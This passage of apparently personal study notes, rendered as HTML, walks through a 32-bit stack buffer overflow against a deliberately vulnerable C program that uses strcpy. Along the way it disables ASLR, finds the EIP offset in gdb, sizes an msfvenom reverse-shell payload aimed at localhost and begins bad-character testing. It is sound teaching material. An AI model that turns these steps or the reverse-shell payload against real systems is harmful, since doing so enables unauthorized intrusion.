+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>   <span class="mh">0x000011e2</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>     <span class="n">lea</span>    <span class="n">ecx</span><span class="p">,[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="p">]</span>
+   <span class="o">----------</span> <span class="o">----</span>      <span class="o">---</span>    <span class="o">-------------</span>
+        <span class="mi">1</span>       <span class="mi">2</span>        <span class="mi">3</span>           <span class="mi">4</span>
+</pre></div>
+</div>
+<ol class="arabic simple">
+<li><p>Memory address</p></li>
+<li><p>Address jumps in memory (in bytes)</p></li>
+<li><p>Assembler instructions</p></li>
+<li><p>Operation Suffixes</p></li>
+</ol>
+</section>
+<section id="data-registers">
+<h2>Data Registers<a class="headerlink" href="#data-registers" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">|</span><span class="mi">32</span><span class="o">-</span><span class="n">bit</span>  <span class="o">|</span><span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="o">|</span><span class="n">Description</span><span class="o">|</span>
+<span class="o">|--------|-------|-----------|</span>
+<span class="o">|</span><span class="n">EAX</span>     <span class="o">|</span><span class="n">RAX</span>    <span class="o">|</span><span class="n">Accumulator</span> <span class="ow">is</span> <span class="n">used</span> <span class="ow">in</span> <span class="nb">input</span><span class="o">/</span><span class="n">output</span> <span class="ow">and</span> <span class="k">for</span> <span class="n">arithmetic</span> <span class="n">operations</span><span class="o">|</span>
+<span class="o">|</span><span class="n">EBX</span>     <span class="o">|</span><span class="n">RBX</span>    <span class="o">|</span><span class="n">Base</span> <span class="ow">is</span> <span class="n">used</span> <span class="ow">in</span> <span class="n">indexed</span> <span class="n">addressing</span><span class="o">|</span>
+<span class="o">|</span><span class="n">ECX</span>     <span class="o">|</span><span class="n">RCX</span>    <span class="o">|</span><span class="n">Counter</span> <span class="ow">is</span> <span class="n">used</span> <span class="n">to</span> <span class="n">rotate</span> <span class="n">instructions</span> <span class="ow">and</span> <span class="n">count</span> <span class="n">loops</span><span class="o">|</span>
+<span class="o">|</span><span class="n">EDX</span>     <span class="o">|</span><span class="n">RDX</span>    <span class="o">|</span><span class="n">Data</span> <span class="ow">is</span> <span class="n">used</span> <span class="k">for</span> <span class="n">I</span><span class="o">/</span><span class="n">O</span> <span class="ow">and</span> <span class="ow">in</span> <span class="n">arithmetic</span> <span class="n">operations</span> <span class="k">for</span> <span class="n">multiply</span> <span class="ow">and</span> <span class="n">divide</span> <span class="n">operations</span> <span class="n">involving</span> <span class="n">large</span> <span class="n">values</span><span class="o">|</span>
+</pre></div>
+</div>
+</section>
+<section id="pointer-registers">
+<h2>Pointer Registers<a class="headerlink" href="#pointer-registers" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">|</span><span class="mi">32</span><span class="o">-</span><span class="n">bit</span>  <span class="o">|</span><span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="o">|</span><span class="n">Description</span><span class="o">|</span>
+<span class="o">|--------|-------|-----------|</span>
+<span class="o">|</span><span class="n">EIP</span>     <span class="o">|</span><span class="n">RIP</span>    <span class="o">|</span><span class="n">Instruction</span> <span class="n">Pointer</span> <span class="n">points</span> <span class="n">to</span> <span class="n">the</span> <span class="n">offset</span> <span class="n">address</span> <span class="n">of</span> <span class="n">the</span> <span class="nb">next</span> <span class="n">instruction</span> <span class="n">to</span> <span class="n">be</span> <span class="n">executed</span><span class="o">|</span>
+<span class="o">|</span><span class="n">EBP</span>     <span class="o">|</span><span class="n">RBP</span>    <span class="o">|</span><span class="n">Stack</span> <span class="n">Base</span> <span class="n">Pointer</span> <span class="ow">or</span> <span class="n">Frame</span> <span class="n">Pointer</span> <span class="n">points</span> <span class="n">to</span> <span class="n">the</span> <span class="n">begining</span> <span class="n">of</span> <span class="n">the</span> <span class="n">stack</span> <span class="p">(</span><span class="n">the</span> <span class="n">base</span> <span class="n">of</span> <span class="n">the</span> <span class="n">stalactite</span><span class="p">)</span><span class="o">|</span>
+<span class="o">|</span><span class="n">ESP</span>     <span class="o">|</span><span class="n">RSP</span>    <span class="o">|</span><span class="n">Stack</span> <span class="n">Pointer</span> <span class="n">points</span> <span class="n">to</span> <span class="n">the</span> <span class="n">end</span> <span class="n">of</span> <span class="n">the</span> <span class="n">stack</span> <span class="p">(</span><span class="n">the</span> <span class="n">tip</span> <span class="n">of</span> <span class="n">the</span> <span class="n">stalactite</span><span class="p">)</span><span class="o">|</span>
+</pre></div>
+</div>
+</section>
+<section id="index-registers">
+<h2>Index Registers<a class="headerlink" href="#index-registers" title="Permalink to this heading">#</a></h2>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">|</span><span class="mi">32</span><span class="o">-</span><span class="n">bit</span>  <span class="o">|</span><span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="o">|</span><span class="n">Description</span><span class="o">|</span>
+<span class="o">|--------|-------|-----------|</span>
+<span class="o">|</span><span class="n">ESI</span>     <span class="o">|</span><span class="n">RSI</span>    <span class="o">|</span><span class="n">Source</span> <span class="n">Index</span> <span class="ow">is</span> <span class="n">used</span> <span class="k">as</span> <span class="n">a</span> <span class="n">pointer</span> <span class="kn">from</span> <span class="nn">a</span> <span class="n">source</span> <span class="k">for</span> <span class="n">string</span> <span class="n">operations</span><span class="o">|</span>
+<span class="o">|</span><span class="n">EDI</span>     <span class="o">|</span><span class="n">RDI</span>    <span class="o">|</span><span class="n">Destination</span> <span class="ow">is</span> <span class="n">used</span> <span class="k">as</span> <span class="n">a</span> <span class="n">pointer</span> <span class="n">to</span> <span class="n">a</span> <span class="n">destination</span> <span class="k">for</span> <span class="n">string</span> <span class="n">operations</span><span class="o">|</span>
+</pre></div>
+</div>
+</section>
+<section id="make-a-vulnerable-program-example">
+<h2>Make a vulnerable program example<a class="headerlink" href="#make-a-vulnerable-program-example" title="Permalink to this heading">#</a></h2>
+<p>writing a small c program, with vulnerable function call strcpy</p>
+<div class="highlight-c notranslate"><div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">bowfunc</span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">string</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+<span class="w">    </span><span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span><span class="w"> </span><span class="n">string</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">argc</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">argv</span><span class="p">[])</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="n">bowfunc</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;Done.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+</div>
+<p>Disable ASLR &amp; Compile the program</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">echo</span><span class="w"> </span><span class="m">0</span><span class="w"> </span>&gt;<span class="w"> </span>/proc/sys/kernel/randomize_va_space<span class="w">  </span><span class="c1"># Was 2</span>
+sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>gcc-multilib
+gcc<span class="w"> </span>bow.c<span class="w"> </span>-o<span class="w"> </span>bow32<span class="w"> </span>-f<span class="w"> </span>no-stack-protector<span class="w"> </span>-z<span class="w"> </span>execstack<span class="w"> </span>-m32
+file<span class="w"> </span>bow32<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s2">&quot;,&quot;</span><span class="w"> </span><span class="s2">&quot;\n&quot;</span>
+</pre></div>
+</div>
+<p>inspect with GDB</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gdb<span class="w"> </span>-q<span class="w"> </span>bow32
+disassemble<span class="w"> </span>main
+<span class="nb">set</span><span class="w"> </span>disasembly-flavor<span class="w"> </span>intel
+disassemble<span class="w"> </span>main
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;set disassembly-flavor intel&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>~/.gdbinit
+</pre></div>
+</div>
+</section>
+<section id="stack-frames">
+<h2>Stack frames<a class="headerlink" href="#stack-frames" title="Permalink to this heading">#</a></h2>
+<p>if we open our bow32 program with gdb, and disasemble the bowfunc function</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">gdb</span> <span class="o">-</span><span class="n">q</span> <span class="n">bow32</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">disas</span> <span class="n">bowfunc</span>
+</pre></div>
+</div>
+<p>The Prologue<br />
+It saves the previous position in the stack so that it can be recovered after the function completes.<br />
+then it creates a new stack frame an makes some space for the new operations and variables to be processed</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>   <span class="mh">0x000011a9</span> <span class="o">&lt;+</span><span class="mi">0</span><span class="o">&gt;</span><span class="p">:</span>     <span class="n">push</span>   <span class="n">ebp</span>          <span class="p">;</span> <span class="n">stores</span> <span class="n">the</span> <span class="n">previous</span> <span class="n">EBP</span>
+   <span class="mh">0x000011aa</span> <span class="o">&lt;+</span><span class="mi">1</span><span class="o">&gt;</span><span class="p">:</span>     <span class="n">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>      <span class="p">;</span> <span class="n">creates</span> <span class="n">a</span> <span class="n">new</span> <span class="n">stack</span> <span class="n">frame</span>
+   <span class="mh">0x000011ac</span> <span class="o">&lt;+</span><span class="mi">3</span><span class="o">&gt;</span><span class="p">:</span>     <span class="n">push</span>   <span class="n">ebx</span>       
+   <span class="mh">0x000011ad</span> <span class="o">&lt;+</span><span class="mi">4</span><span class="o">&gt;</span><span class="p">:</span>     <span class="n">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x404</span>    <span class="p">;</span> <span class="n">moves</span> <span class="n">esp</span> <span class="n">to</span> <span class="n">the</span> <span class="n">top</span>
+</pre></div>
+</div>
+<p>The Epilogue<br />
+for getting out of the stack from the oposite is done.<br />
+the ESP is replaced by the current EBP, and its value is reset to what it was before the prologue.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>   <span class="mh">0x000011dc</span> <span class="o">&lt;+</span><span class="mi">51</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">leave</span>
+   <span class="mh">0x000011dd</span> <span class="o">&lt;+</span><span class="mi">52</span><span class="o">&gt;</span><span class="p">:</span>    <span class="n">ret</span>
+</pre></div>
+</div>
+</section>
+<section id="taking-control-of-the-eip">
+<h2>Taking control of the EIP<a class="headerlink" href="#taking-control-of-the-eip" title="Permalink to this heading">#</a></h2>
+<p>If we can take control of the instruction pointer, we can tell it where to jump, and point it to where our shellcode starts.</p>
+<p>We can use python to give 1200 U char as input, which causes a segmentation fault.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gdb<span class="w"> </span>-q<span class="w"> </span>bow32
+Reading<span class="w"> </span>symbols<span class="w"> </span>from<span class="w"> </span>bow32...
+<span class="o">(</span>No<span class="w"> </span>debugging<span class="w"> </span>symbols<span class="w"> </span>found<span class="w"> </span><span class="k">in</span><span class="w"> </span>bow32<span class="o">)</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;\x55&#39; * 1200&quot;</span><span class="k">)</span>
+Starting<span class="w"> </span>program:<span class="w"> </span>/home/blnkn/c/bow32<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;\x55&#39; * 1200&quot;</span><span class="k">)</span>
+
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
+0x55555555<span class="w"> </span><span class="k">in</span><span class="w"> </span>??<span class="w"> </span><span class="o">()</span>
+</pre></div>
+</div>
+<p>But we can see that the EIP has been overwritten with U’s (0x55), this is why we’re seeing a segfault.<br />
+Because the EIP looks for an instruction at the address 0x55555555, and that is not a thing.</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">info</span> <span class="n">registers</span>
+<span class="n">eax</span>            <span class="mh">0x1</span>                 <span class="mi">1</span>
+<span class="n">ecx</span>            <span class="mh">0xffffd720</span>          <span class="o">-</span><span class="mi">10464</span>
+<span class="n">edx</span>            <span class="mh">0xffffd0e0</span>          <span class="o">-</span><span class="mi">12064</span>
+<span class="n">ebx</span>            <span class="mh">0x55555555</span>          <span class="mi">1431655765</span>
+<span class="n">esp</span>            <span class="mh">0xffffd040</span>          <span class="mh">0xffffd040</span>
+<span class="n">ebp</span>            <span class="mh">0x55555555</span>          <span class="mh">0x55555555</span>
+<span class="n">esi</span>            <span class="mh">0xf7fa9000</span>          <span class="o">-</span><span class="mi">134574080</span>      <span class="p">;</span> <span class="n">EBP</span> <span class="n">overwritten</span>
+<span class="n">edi</span>            <span class="mh">0xf7fa9000</span>          <span class="o">-</span><span class="mi">134574080</span>
+<span class="n">eip</span>            <span class="mh">0x55555555</span>          <span class="mh">0x55555555</span>      <span class="p">;</span> <span class="n">EIP</span> <span class="n">overwritten</span>
+<span class="n">eflags</span>         <span class="mh">0x10286</span>             <span class="p">[</span> <span class="n">PF</span> <span class="n">SF</span> <span class="n">IF</span> <span class="n">RF</span> <span class="p">]</span>
+<span class="n">cs</span>             <span class="mh">0x23</span>                <span class="mi">35</span>
+<span class="n">ss</span>             <span class="mh">0x2b</span>                <span class="mi">43</span>
+<span class="n">ds</span>             <span class="mh">0x2b</span>                <span class="mi">43</span>
+<span class="n">es</span>             <span class="mh">0x2b</span>                <span class="mi">43</span>
+<span class="n">fs</span>             <span class="mh">0x0</span>                 <span class="mi">0</span>
+<span class="n">gs</span>             <span class="mh">0x63</span>                <span class="mi">99</span>
+<span class="p">(</span><span class="n">gdb</span><span class="p">)</span>
+</pre></div>
+</div>
+<p>This is what happened:
+<img alt="buffer.png" src="../../../../_images/buffer.png" /></p>
+<p>So this means we now need to determine the offset of the EIP from where we are, once we know that, we ccan give the exact ammount of padding and end with the 4bytes representing the address we want to point the instruction pointer at next.</p>
+<p>generate some input the <code class="docutils literal notranslate"><span class="pre">pattern_create.rb</span></code></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb<span class="w"> </span>-l<span class="w"> </span><span class="m">1200</span><span class="w"> </span>&gt;<span class="w"> </span>pattern.txt
+</pre></div>
+</div>
+<p>and feed that to our program input</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9&#39;&quot;</span><span class="k">)</span><span class="w"> </span>
+
+The<span class="w"> </span>program<span class="w"> </span>being<span class="w"> </span>debugged<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>started<span class="w"> </span>already.
+Start<span class="w"> </span>it<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>beginning?<span class="w"> </span><span class="o">(</span>y<span class="w"> </span>or<span class="w"> </span>n<span class="o">)</span><span class="w"> </span>y
+
+Starting<span class="w"> </span>program:<span class="w"> </span>/home/student/bow/bow32<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;Aa0Aa1Aa2Aa3Aa4Aa5...&lt;SNIP&gt;...Bn6Bn7Bn8Bn9&#39;&quot;</span><span class="k">)</span>
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
+0x69423569<span class="w"> </span><span class="k">in</span><span class="w"> </span>??<span class="w"> </span><span class="o">()</span>
+</pre></div>
+</div>
+<p>now we can see what section of that patern is reflected in the EIP</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>info<span class="w"> </span>registers<span class="w"> </span>eip
+eip<span class="w">            </span>0x69423569<span class="w">          </span>0x69423569
+</pre></div>
+</div>
+<p><img alt="buffer-2.png" src="../../../../_images/buffer-2.png" /></p>
+<p>so we can use <code class="docutils literal notranslate"><span class="pre">pattern_offset.rb</span></code> to calculate the offset</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb<span class="w"> </span>-q<span class="w"> </span>0x69423569
+<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Exact<span class="w"> </span>match<span class="w"> </span>at<span class="w"> </span>offset<span class="w"> </span><span class="m">1036</span>
+</pre></div>
+</div>
+<p>now we know exactly how much padding we need to give to be able to write a new address in the EIP:<br />
+and we can double check that it works with some basic python, note that we’re using python2, simply because it’s easyer to print raw bytes.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>gdb<span class="w"> </span>-q<span class="w"> </span>bow32
+Reading<span class="w"> </span>symbols<span class="w"> </span>from<span class="w"> </span>bow32...
+<span class="o">(</span>No<span class="w"> </span>debugging<span class="w"> </span>symbols<span class="w"> </span>found<span class="w"> </span><span class="k">in</span><span class="w"> </span>bow32<span class="o">)</span>
+<span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;\x55&#39; * 1036 + &#39;\x66&#39; * 4&quot;</span><span class="k">)</span>
+Starting<span class="w"> </span>program:<span class="w"> </span>/home/blnkn/c/bow32<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;\x55&#39; * 1036 + &#39;\x66&#39; * 4&quot;</span><span class="k">)</span>
+
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
+0x66666666<span class="w"> </span><span class="k">in</span><span class="w"> </span>??<span class="w"> </span><span class="o">()</span>
+</pre></div>
+</div>
+<p><img alt="buffer-3.png" src="../../../../_images/buffer-3.png" /></p>
+</section>
+<section id="determing-the-length-we-need-for-our-shellcode">
+<h2>Determing the length we need for our shellcode<a class="headerlink" href="#determing-the-length-we-need-for-our-shellcode" title="Permalink to this heading">#</a></h2>
+<p>Generate shellcode with msfvenom, just to get hte payload size</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>msfvenom<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-p<span class="w"> </span>linux/x86/shell_reverse_tcp<span class="w"> </span><span class="nv">lhost</span><span class="o">=</span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="nv">lport</span><span class="o">=</span><span class="m">1337</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--platform<span class="w"> </span>linux<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--arch<span class="w"> </span>x86<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>--format<span class="w"> </span>c<span class="w"> </span>
+</pre></div>
+</div>
+<p>We now know that our payload will be about 68 bytes. As a precaution, we should try to take a larger range if the shellcode increases due to later specifications.</p>
+<p>Often it can be useful to insert some no operation instruction (NOPS) before our shellcode begins so that it can be executed cleanly</p>
+<p>In summary:</p>
+<ol class="arabic simple">
+<li><p>We need a total of 1040 bytes to get to the EIP.</p></li>
+<li><p>Here, we can use an additional 100 bytes of NOPs</p></li>
+<li><p>150 bytes for our shellcode.</p></li>
+</ol>
+<p><img alt="buffer-4.png" src="../../../../_images/buffer-4.png" /></p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>   <span class="n">Buffer</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x55</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">1040</span> <span class="o">-</span> <span class="mi">100</span> <span class="o">-</span> <span class="mi">150</span> <span class="o">-</span> <span class="mi">4</span><span class="p">)</span> <span class="o">=</span> <span class="mi">786</span>
+     <span class="n">NOPs</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">100</span>
+<span class="n">Shellcode</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x44</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">150</span>
+      <span class="n">EIP</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x66</span><span class="s2">&quot;</span> <span class="o">*</span> <span class="mi">4</span><span class="s1">&#39;</span>
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>run<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;\x55&#39; * (1036 - 100 - 150) + &#39;\x90&#39; * 100 + &#39;\x44&#39; * 150 + &#39;\x66&#39; * 4&quot;</span><span class="k">)</span>
+The<span class="w"> </span>program<span class="w"> </span>being<span class="w"> </span>debugged<span class="w"> </span>has<span class="w"> </span>been<span class="w"> </span>started<span class="w"> </span>already.
+Start<span class="w"> </span>it<span class="w"> </span>from<span class="w"> </span>the<span class="w"> </span>beginning?<span class="w"> </span><span class="o">(</span>y<span class="w"> </span>or<span class="w"> </span>n<span class="o">)</span><span class="w"> </span>y
+Starting<span class="w"> </span>program:<span class="w"> </span>/home/blnkn/c/bow32<span class="w"> </span><span class="k">$(</span>python<span class="w"> </span>-c<span class="w"> </span><span class="s2">&quot;print &#39;\x55&#39; * (1036 - 100 - 150) + &#39;\x90&#39; * 100 + &#39;\x44&#39; * 150 + &#39;\x66&#39; * 4&quot;</span><span class="k">)</span>
+
+Program<span class="w"> </span>received<span class="w"> </span>signal<span class="w"> </span>SIGSEGV,<span class="w"> </span>Segmentation<span class="w"> </span>fault.
+0x66666666<span class="w"> </span><span class="k">in</span><span class="w"> </span>??<span class="w"> </span><span class="o">()</span>
+</pre></div>
+</div>
+<p><img alt="buffer-5.png" src="../../../../_images/buffer-5.png" /></p>
+</section>
+<section id="identifying-bad-characters">
+<h2>Identifying bad characters<a class="headerlink" href="#identifying-bad-characters" title="Permalink to this heading">#</a></h2>
+<p>usual culprits</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>\<span class="n">x00</span> <span class="o">-</span> <span class="n">Null</span> <span class="n">Byte</span>
+\<span class="n">x0A</span> <span class="o">-</span> <span class="n">Line</span> <span class="n">Feed</span>
+\<span class="n">x0D</span> <span class="o">-</span> <span class="n">Carriage</span> <span class="n">Return</span>
+\<span class="n">x20</span> <span class="o">-</span> <span class="n">Space</span>
+\<span class="n">xFF</span> <span class="o">-</span> <span class="n">Form</span> <span class="n">Feed</span>
+</pre></div>
+</div>
+<p>we’re gonna be using a list of test characters</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">CHARS</span><span class="o">=</span><span class="s2">&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>printf $CHARS|sed &#39;s/\\x//g&#39;|xxd
+00000000: 0001 0203 0405 0607 0809 0a0b 0c0d 0e0f  ................
+00000010: 1011 1213 1415 1617 1819 1a1b 1c1d 1e1f  ................
+00000020: 2021 2223 2425 2627 2829 2a2b 2c2d 2e2f   !&quot;#$%&amp;&#39;()*+,-./
+00000030: 3031 3233 3435 3637 3839 3a3b 3c3d 3e3f  0123456789:;&lt;=&gt;?
+00000040: 4041 4243 4445 4647 4849 4a4b 4c4d 4e4f  @ABCDEFGHIJKLMNO
+00000050: 5051 5253 5455 5657 5859 5a5b 5c5d 5e5f  PQRSTUVWXYZ[\]^_
+00000060: 6061 6263 6465 6667 6869 6a6b 6c6d 6e6f  `abcdefghijklmno
+00000070: 7071 7273 7475 7677 7879 7a7b 7c7d 7e7f  pqrstuvwxyz{|}~.
+00000080: 8081 8283 8485 8687 8889 8a8b 8c8d 8e8f  ................
+00000090: 9091 9293 9495 9697 9899 9a9b 9c9d 9e9f  ................
+000000a0: a0a1 a2a3 a4a5 a6a7 a8a9 aaab acad aeaf  ................
+000000b0: b0b1 b2b3 b4b5 b6b7 b8b9 babb bcbd bebf  ................
+000000c0: c0c1 c2c3 c4c5 c6c7 c8c9 cacb cccd cecf  ................
+000000d0: d0d1 d2d3 d4d5 d6d7 d8d9 dadb dcdd dedf  ................
+000000e0: e0e1 e2e3 e4e5 e6e7 e8e9 eaeb eced eeef  ................
+000000f0: f0f1 f2f3 f4f5 f6f7 f8f9 fafb fcfd feff  ................
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">printf</span><span class="w"> </span><span class="nv">$CHARS</span><span class="p">|</span>sed<span class="w"> </span><span class="s1">&#39;s/\\x//g&#39;</span><span class="p">|</span>wc<span class="w"> </span>-c
+<span class="m">256</span>
+</pre></div>
+</div>
+<p>set a breakpoint to inspect the state of the memory as we’re calling bowfunc</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span><span class="k">break</span><span class="w"> </span>bowfunc
+Breakpoint<span class="w"> </span><span class="m">1</span><span class="w"> </span>at<span class="w"> </span>0x565561ad
+</pre></div>
+</div>
+<p>and send our characters</p>
